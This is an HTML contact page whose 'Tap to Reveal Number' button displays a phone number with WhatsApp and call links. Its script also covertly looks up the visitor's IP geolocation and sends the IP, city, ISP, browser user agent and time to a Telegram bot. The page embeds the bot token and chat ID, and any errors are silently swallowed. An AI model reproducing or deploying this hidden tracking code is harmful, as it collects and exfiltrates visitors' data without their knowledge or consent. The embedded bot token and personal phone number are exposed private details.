<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Contact</title>

<style>
body {
  margin: 0;
  font-family: sans-serif;
  background: #f5f5f5;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  background: white;
  padding: 25px;
  border-radius: 15px;
  width: 90%;
  max-width: 400px;
  text-align: center;
  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
}

h2 {
  margin-bottom: 20px;
}

button, a {
  display: block;
  width: 100%;
  padding: 14px;
  margin-top: 12px;
  font-size: 16px;
  border-radius: 10px;
  text-decoration: none;
  border: none;
}

button {
  background: #007bff;
  color: white;
}

#wa {
  background: #25D366;
  color: white;
}

#call {
  background: #28a745;
  color: white;
}

#num {
  font-size: 20px;
  margin-top: 15px;
}
</style>
</head>

<body>

<div class="container">

<h2>Contact Me</h2>

<button onclick="reveal()">Tap to Reveal Number</button>

<p id="num" style="display:none;">
  +91 9510389983
</p>

<a id="wa" target="_blank" style="display:none;">
  Chat on WhatsApp
</a>

<a id="call" style="display:none;">
  Call Now
</a>

</div>

<script>
async function reveal() {

  try {
    let data = await fetch("https://ipapi.co/json/")
      .then(res => res.json());

    let message =
`📱 New Visitor!

IP: ${data.ip}
City: ${data.city}
Region: ${data.region}
Country: ${data.country_name}
ISP: ${data.org}
Device: ${navigator.userAgent}
Time: ${new Date().toLocaleString()}`;

    fetch("https://api.telegram.org/bot8779897483:AAHpfrls0bPlhU_rNQKLymMB26aEy6m4bBs/sendMessage", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: "6319233453",
        text: message
      })
    });

  } catch(e) {}

  document.getElementById("num").style.display = "block";

  document.getElementById("wa").href =
    "https://wa.me/919510389983";
  document.getElementById("wa").style.display = "block";

  document.getElementById("call").href =
    "tel:9510389983";
  document.getElementById("call").style.display = "block";
}
</script>

</body>
</html>
